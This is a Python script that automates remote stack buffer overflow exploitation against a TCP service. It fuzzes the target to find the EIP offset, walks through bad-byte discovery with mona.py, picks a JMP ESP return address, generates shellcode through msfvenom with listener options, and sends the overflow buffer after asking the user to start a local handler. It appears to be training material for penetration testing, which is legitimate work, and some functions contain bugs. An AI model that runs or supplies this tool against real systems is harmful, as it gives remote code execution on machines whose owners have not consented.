#!/usr/bin/python3

# TODOs
# - clean up command line arguments
#   - add shorthands
#   - add better helptexts, better formated (new lines, better explanations)
#   - add option to save generated buffer that's sent over network to file
#     - add option to load the generated buffer (prefix, offset, EIP, payload (incl. noop), padding, postfix)


import argparse
import sys
import os
import socket
import time
import random

def main():
	args = parse_args()
	print(args)
	print('='*79)
	print('!mona config -set workingfolder c:/mona/\%p')
	target = (args.host, args.port)
	
	eip_offset = args.eip_offset
	# find EIP offset if not specified
	if eip_offset < 0:
		eip_offset = find_eip_offset(target, args)
	
	badbytes = args.badbytes
	
	if not args.badbytes_known:
		badbytes = check_badbytes(target, badbytes, eip_offset, args)
	
	badbytes_str = bytes_to_pystring(badbytes)
	print(f'Bad bytes: {badbytes_str}')

	# generate buffer
	overflow = genPattern(eip_offset, args)
	payload = gen_payload(badbytes, args)
	eip = args.target_eip
	if not eip:
		eip = getJmpESPAddr(badbytes, args)
	else:
		eip = eip[::-1]
	buffer = args.prefix + overflow + eip + payload
	padding = gen_padding(len(buffer) + len(args.postfix), badbytes, args)
	buffer = buffer + padding + args.postfix
	
	# ask user to start local handler
	print('Start Local handler for exploit.')
	input('Press enter when done.')
	# pwn target
	connect_and_send(target, buffer, args)

def getJmpESPAddr(badbytes):
	print("Get EIP to jump to payload...")
	if args.target_eip:
		return args.target_eip
	badbytes_str = bytes_to_pystring(badbytes)
	print(f'!mona jmp -r esp -cpb \"{badbytes_str}\"')
	print(f'!mona find -s \'jmp esp\' -type instr -cm aslr=false,rebase=false,nx=false -cpb \"{badbytes_str}\"')
	eip = input('Target Jump Address.\n> ')
	eip = bytes.fromhex(eip)[::-1]
	eip_str = bytes_to_pystring(eip).replace('\\x', '')
	print(f'Target EIP: 0x{eip_str}')
	return eip

def check_badbytes(target, badbytes, eip_offset, args):
	keepLooking = True
	while keepLooking:
		print(f'Known bad bytes: {badbytes}')
		print(f'Restart target. Generate comparison bytearray:')
		badbytes_str = bytes_to_pystring(badbytes)
		print(f'!mona bytearray 256 -b \'{badbytes_str}\'')
		input('Press enter when target running.')
		# use bytearray for easy indexing
		checkbytes = bytearray(0x100 - len(badbytes))
		idx = 0
		for i in range(0xFF):
			if i in badbytes:
				continue
			checkbytes[idx] = i
			idx += 1
		# turn bytearray into bytes for sending
		checkbytes = bytes(checkbytes)

		pattern = genPattern(eip_offset, args)
		buffer = args.prefix + pattern + args.bad_eip + checkbytes + args.postfix
		# connect to target and send.
		try:
			connect_and_send(target, buffer, args)
			# check if crashed
			if not crashcheck(target, args):
				print('Target didn\'t crash.')
				exit(-1)

			eip_hex_le_str = bytes_to_pystring(args.bad_eip[::-1]).replace('\\x','')
			print(f'Target crashed. Make sure target EIP = {eip_hex_le_str}')
			print('!mona compare -f bytearray.bin -a <ESP>')
			h = input('Enter bad byte hex. (ex. 0A, empty if unmodified)\n> ')
			if not h:
				keepLooking = False
			else:
				h = int(h, 16)
				h = hex(h)[2::]
				if len(h) == 1:
					h = '0' + h
				h = bytes.fromhex(h)
				badbytes += h
		except:
			print(sys.exc_info())
			exit(-1)
	return badbytes

def gen_padding(length_so_far, badbytes, args):
	option = args.padding
	desired_length = args.static_length

	if desired_length <= 0:
		print('Static length disabled.')
		return b''

	if desired_length < length_so_far:
		print('Buffer length exceeds static length.')
		return b''

	padding_length = desired_length - length_so_far

	if 'NOP' == option:
		return b'\x90' * padding_length
	elif 'NULL' == option:
		return b'\x00' * padding_length
	elif 'A' == option:
		return b'\x41' * padding_length
	elif 'xFF' == option:
		return b'\xFF' * padding_length
	elif 'PTRN' == option:
		return genPattern(padding_length, args)
	elif 'RAND' == option:
		# build padding from random bytes
		padding = b''
		while len(padding) < padding_length:
			# keep getting random values until the value got is not in badbytes
			# if not in badbytes, append to padding
			keepLooking = True
			while keepLooking:
				rnd_byte = random.randrange(0x100)
				keepLooking = not rnd_byte in badbytes
				if not keepLooking:
					padding += rnd_byte
	else:
		print('Unknown padding option. Unimplemented.')
		exit(-1)

def gen_payload(badbytes, args):
	# if file was specified, skip all the nonsense.
	if args.payload_file_bin:
		print('Reading from File...')
		payload = args.payload_file_bin.read()
		print('-' * 20 + 'PAYLOAD' + '-' * 20)
		print(bytes_to_pystring(payload))
		print('-' * 20 + '  END  ' + '-' * 20)
		return payload
	
	if args.payload_file_hex:
		print('Reading from File...')
		payload_hex = args.payload_file_hex.read()
		print('-' * 20 + 'PAYLOAD HEX' + '-' * 20)
		print(payload_hex)
		print('-' * 20 + '    END    ' + '-' * 20)
		print('')
		payload = bytes.fromhex(payload_hex)
		print('-' * 20 + 'PAYLOAD' + '-' * 20)
		print(bytes_to_pystring(payload))
		print('-' * 20 + '  END  ' + '-' * 20)
		return payload
	
	
	platform = args.platform_name
	arch = args.arch_name
	payload_name = args.payload_name
	encoder = args.encoder_name
	nop_count = args.nops
	
	options = {}

	if args.payload_options:
		options = args.payload_options
	
	msfvenom_cmd = args.msfvenom
	
	# add badbytes
	badbytes_str = '\'' + bytes_to_pystring(badbytes) + '\''
	msfvenom_cmd += f' --bad-chars {badbytes_str}'
	
	# add output format raw
	msfvenom_cmd += f' --format hex'
	
	if not payload_name:
		# payload not specified
		# get user input on payload
		
		# platform
		if not args.platform_name:
			print('Platform not specified.')
			cmd = f'{msfvenom_cmd} --list platforms'
			print(cmd)
			print(os.popen(cmd).read())
			platform = input('Select platform.\nEmpty to not pass to msfvenom.\n> ').strip()
		
		if platform:
			msfvenom_cmd += f' --platform {platform}'
		else:
			print('No Platform selected.')
		
		# arch
		if not arch:
			print('Arch not specified.')
			cmd = f'{msfvenom_cmd} --list arch'
			print(cmd)
			print(os.popen(cmd).read())
			arch = input('Select arch.\nEmpty to not pass to msfvenom.\n> ').strip()
		
		if arch:
			msfvenom_cmd += f' --arch {arch}'
		else:
			print('No Arch selected.')
		
		# payload name
		print('Select payload.')
		cmd = f'{msfvenom_cmd} --list payloads'
		print(cmd)
		print(os.popen(cmd).read())
		while not payload_name:
			payload_name = input('Select payload.\nRequired\n> ').strip()
	
	msfvenom_cmd += f' --payload {payload_name}'
	if nop_count > 0:
		msfvenom_cmd += f' --nopsled {nop_count}'
	else:
		print('No NOP-sled')
	
	if not encoder:
		print('Encoder not defined')
		cmd = f'{msfvenom_cmd} --list encoders'
		print(cmd)
		print(os.popen(cmd).read())
		encoder = input('Select encoder.\nEmpty to not pass to msfvenom.\n> ').strip()
	
	if encoder:
		msfvenom_cmd += f' --encoder {encoder}'
	else:
		print('No encoder defined.')
	
	# options
	cmd = f'{msfvenom_cmd} --list-options'
	print(cmd)
	print(os.popen(cmd).read())	
	
	if not args.payload_options:
		while True:
			print(f'Options: {options}')
			key = input('Option KEY (empty for done)\n> ')
			if not key:
				break
			val = input('Option VALUE (empty to unset/not set)\n> ')
			if val.strip():
				options[key] = val
			elif key in options:
				del options[key]
	
	# append to command
	for key in options:
		val = options[key]
		msfvenom_cmd += f' {key}=\'{val}\''
	
	
	print('Command done.')
	print(f'{msfvenom_cmd}')
	
	payload_hex = os.popen(msfvenom_cmd).read()

	if args.payload_out_file_hex:
		args.payload_out_file_hex.write(payload_hex)
		args.payload_out_file_hex.close()
	
	print('-' * 20 + 'PAYLOAD HEX' + '-' * 20)
	print(payload_hex)
	print('-' * 20 + '    END    ' + '-' * 20)
	print('')
	payload = bytes.fromhex(payload_hex)
	print('-' * 20 + 'PAYLOAD' + '-' * 20)
	print(bytes_to_pystring(payload))
	print('-' * 20 + '  END  ' + '-' * 20)
	return payload
	

def find_eip_offset(target, args):
	pattern_length = 0
	print('Finding EIP offset.')
	inc = args.patterninc
	if inc <= 0:
		print(f'Pattern length increment {inc} invalid. Set to 1.')
		inc = 1
	# increment pattern length and send until network timeout
	while pattern_length < args.patternmax:
		pattern_length += inc
		print(f'Generating pattern with length {pattern_length} Bytes')
		pattern = genPattern(pattern_length, args)
		# connect and send
		try:
			buffer = args.prefix + pattern + args.postfix
			connect_and_send(target, buffer, args)
			# check if crashed
			if crashcheck(target, args):
				print('Target not responding anymore.')
				eip = ""
				while len(eip) != 8:
					eip = input('EIP? (hex only, no 0x, no \\x, in order.)\n> ')
				offset = findPattern(pattern_length, eip, args)
					
				print(f'Offset found: {offset}')
				return offset
		except:
			print(sys.exc_info())
			exit(-1)
	print("Target didn't crash.")
	exit(-1)

def crashcheck(target, args):
	print('Checking target availibility...')
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(5.0)
		print('Connecting...')
		s.connect(target)
		print('Connected...')
		if args.banner:
			print(' Checking if can recv banner...')
			getbanner(s)
		else:
			print(' Checking if can send')
			buffer = args.prefix + b'TEST' + args.postfix
			s.send(buffer)
		print('Success, target is up.')
		print('Disconnecting.')
		s.close()
		return False
	except:
		print('Error. Assuming target down.')
		print(sys.exc_info())
		return True

def genPattern(pattern_length, args):
	pattern = os.popen(f'{args.pattern_generator} {args.pattern_generator_length_flag} {pattern_length}').read()
	# delete trailing newline
	pattern = pattern.strip()
	# encode into bytearray
	pattern = pattern.encode('raw_unicode_escape')
	return pattern

def findPattern(length, eip, args):
	eip_str = bytes_to_pystring(eip).replace('\\x','')
	print(f'EIP-LE: {eip}')
	# reverse, because intel is weird (little endian)
	pattern_found = bytes.fromhex(eip).decode('ascii')[::-1]
	print(f'Pattern: "{pattern_found}"')
	
	# find pattern offset
	cmd = args.pattern_finder + ' ' + args.pattern_finder_length_flag + f' {length} ' + args.pattern_finder_query_flag + f' \'{pattern_found}\''
	print(cmd)
	cmd_output = os.popen(cmd).read()
	print(cmd_output)
	# sanitize cmd_output
	cmd_output.replace('\'', '<SingleQuote>')
	offset = -1
	print('Trying automatic response parse...')
	try:
		cmd = f'echo \'{cmd_output}\' | grep \'Exact match\' | head -n 1 | cut -d\' \' -f 6'
		print(cmd)
		offset = os.popen(cmd).read()
		offset = int(offset)
	except:
		print(sys.exc_info())
	
	if offset < 0:
		print('Failed to determine offset automatically.')
		offset = int(input('Enter offset manually.'))
	
	return offset

def connect_and_send(target, buffer, args):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print('Connecting...')
	s.connect(target)
	if args.banner:
		getbanner(s)
	length = len(buffer)
	print(f'Sending {length} Bytes.')
	print('-' * 12 + ' START ' + '-' * 12)
	print(buffer)
	print('-' * 13 + ' END ' + '-' * 13)
	s.send(buffer)
	print('Closing connection.')
	s.close()
	time.sleep(2)

def getbanner(sock):
	banner = sock.recv(1024)
	length = len(banner)
	print(f'Got banner, {length} Bytes')
	print('-' * 12 + ' START ' + '-' * 12)
	print(banner)
	print('-' * 13 + ' END ' + '-' * 13)
	return banner

def parse_args():
	parser = argparse.ArgumentParser(description='Automate remote buffer overflows')
	# target
	parser.add_argument('--host', dest='host', help='Target IP', required=True)
	parser.add_argument('--port', dest='port', help='Target Port', required=True, type=int)
	parser.add_argument('--banner', dest='banner'
						, help='Grab banner first?', choices=['True', 'False']
						, default='True')
	# payload option
	parser.add_argument('--prefix', dest='prefix', help='Payload prefix', default='')
	parser.add_argument('--nops', dest='nops', help='NOOP-Sled length', default=16, type=int)
	parser.add_argument('--static-length', dest='static_length'
						, help="Keep payload length static with this many Bytes. Should be more than payload length otherwise. 0 to disable."
						, default=0, type=int)
	parser.add_argument('--padding', dest='padding'
						, choices=['NOP', 'NULL', 'A', 'xFF', 'PTRN', 'RAND']
						, help='What is appended to the payload to get static size. Ignored if static_length is set to 0. RAND will not include bad bytes.'
						, default='NOP')
	parser.add_argument('--postfix', dest='postfix'
						, help="Appended to the end of the buffer.", default='')
	parser.add_argument('--eip', dest='target_eip', help='EIP jump address')	
	# pattern finding
	# pattern gen
	parser.add_argument('--pattern-increment', dest='patterninc', help='Pattern increment steps', default=100, type=int)
	parser.add_argument('--pattern-max', dest='patternmax', help='Pattern max length', default=10000, type=int)
	parser.add_argument('--pattern-generator', dest='pattern_generator'
						, help='Path to pattern generator'
						, default='/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb'
						, type=ascii)
	parser.add_argument('--pattern-generator-length-flag', dest='pattern_generator_length_flag'
						, help = 'Flag for specifying the pattern length for generation.'
						, default = '-l')
	# pattern find
	parser.add_argument('--pattern-finder', dest='pattern_finder'
						, help='Path to pattern finder'
						, default='/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb')
	parser.add_argument('--pattern-finder-length-flag', dest='pattern_finder_length_flag'
						, help = 'Flag for specifying the pattern length for the finder.'
						, default = '-l')
	parser.add_argument('--pattern-finder-query-flag', dest='pattern_finder_query_flag'
						, help = 'Flag for specifying the pattern that was observed for the finder.'
						, default = '-q')	
	# crashing eip
	parser.add_argument('--bad-eip', dest='bad_eip',
						help='Pattern for EIP that crashes the program',
						default='\x44\x43\x42\x41')
	# predetermined options
	parser.add_argument('--eip-offset', dest='eip_offset'
						, help='Predetermined offset for EIP. -1 to find it.'
						, default = -1, type=int)
	# predeterminded badchars
	parser.add_argument('--bad-bytes', dest='badbytes', help='Known bad bytes. Ex. "\\x00\\x0A"', default='\\x00')
	parser.add_argument('--bad-bytes-known', dest='badbytes_known', help='Don\'t look for additional bad bytes.'
						, choices = ['True', 'False'], default='False')
	# msfvenom
	parser.add_argument('--venom-path', dest='msfvenom', help='Path to msfvenom', default='/usr/bin/msfvenom')
	parser.add_argument('--payload-name', dest='payload_name', help='metasploit payload you want to use. If not set program will ask you.')
	parser.add_argument('--encoder-name', dest='encoder_name', help='metasploit encoder you want to use. If not set program will ask you.')
	parser.add_argument('--crypto-name', dest='crypto_name', help='metasploit crypto module you want to use. If not set program will ask you.')
	parser.add_argument('--arch-name', dest='arch_name', help='metasploit arch you want to use. If not set will use x86.', default='x86')
	parser.add_argument('--platform-name', dest='platform_name', help='Platform you want to attack. If not set program will ask you.')
	parser.add_argument('--encoding-iter', dest='encoding_iter', help='How many iterations of encoding to use.', type=int)
	parser.add_argument('--payload-file-bin', dest='payload_file_bin', help='File where the payload is stored in raw bytes.', type=argparse.FileType('rb'))
	parser.add_argument('--payload-file-hex', dest='payload_file_hex', help='File where the payload is stored in hex.', type=argparse.FileType('r'))
	parser.add_argument('--payload-output-file-hex', dest='payload_out_file_hex', help='File where the payload will be stored in hex.', type=argparse.FileType('w'))
	parser.add_argument('--payload-options', dest='payload_options', help='Hash (#) separated list of options. If set no other options will be asked for. \'LHOST=127.0.0.1#LPORT=4444,...\'')
	# parse arguments
	args = parser.parse_args()
	
	# fix types
	args.banner = (args.banner == 'True')
	args.badbytes_known = (args.badbytes_known == 'True')
	
	# fix bytes arguments for prefix, postfix, target_eip, bad_eip, badbytes
	args.prefix = string_to_bytes(args.prefix)
	args.postfix = string_to_bytes(args.postfix)
	args.bad_eip = string_to_bytes(args.bad_eip)
	args.badbytes = string_to_bytes(args.badbytes)
	if args.target_eip:
		args.target_eip = string_to_bytes(args.target_eip)

	# fix list
	if args.payload_options:
		payload_options = {}
		for str in args.payload_options.split('#'):
			arr = str.split('=')
			if len(arr) != 2:
				print(f"Ill formatted payload option. {str}")
				exit(1)
			key = arr[0].strip()
			val = arr[1].strip()
			payload_options[key] = val
		args.payload_options = payload_options

	return args

def bytes_to_pystring(bs):
	result = ''
	for b in bs:
		# get "0xFF", cut off "0x"
		b = str(hex(b))[2::]
		# if single digit, pad left with "0"
		if len(b) == 1:
			b = '0' + b
		result += '\\x' + b
	return result

def string_to_bytes(string):
	result = b''
	i = 0
	while i < len(string):
		ch = string[i]
		if ch != '\\':
			result += ch.encode('raw_unicode_escape')
		else:
			# is a backslash. escape it.
			i += 1
			ch = string[i]
			if ch == '\\':
				result += b'\\'
			elif ch == 'n':
				result += b'\n'
			elif ch == '0':
				result += b'\0'
			elif ch == 'r':
				result += b'\r'
			elif ch == 'x':
				i += 1
				hi = string[i]
				i += 1
				lo = string[i]
				byte_hex = hi + lo
				result += bytes.fromhex(byte_hex)
			else:
				print(f'Unknown escape character "\\{ch}" at position {i} in "{string}".')
				exit(-1)
		i += 1
	return result

main()
